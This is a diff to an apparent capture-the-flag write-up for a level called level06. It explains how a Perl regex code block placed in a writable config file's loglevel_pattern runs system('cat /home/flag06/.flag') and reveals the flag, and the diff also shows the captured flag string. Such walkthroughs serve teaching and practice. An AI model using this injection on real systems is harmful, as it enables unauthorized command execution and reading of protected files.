@@ -54,12 +54,12 @@ We can write inside, thanks to our group `raven`. We need 2 things, the eval inj
 
 ```ini
 # raven configuration
-log_dir          = /tmp/level06
+log_dir          = /tmp
 max_size         = 10485760
 retention_days   = 7
 loglevel_pattern = (?{ system("cat /home/flag06/.flag"); exit }).*
 ```
 
-The eval injection is made by this line : `loglevel_pattern = (?{ system("cat /home/flag06/.flag"); exit }).*`. The system call is executed for every line (thus the exit). We also modify the log_dir to a folder that we can read and write in. We also put a log file inside, here flag.log, but the content is irrelevant.
+The eval injection is made by this line : `loglevel_pattern = (?{ system("cat /home/flag06/.flag"); exit }).*`. The system call is executed for every line (thus the exit). We also modify the log_dir to a folder that we can read and write in.
 
 We now execute the binary, and we get exactly the flag, that is : wizelohxamaiuiia2uinaes4a
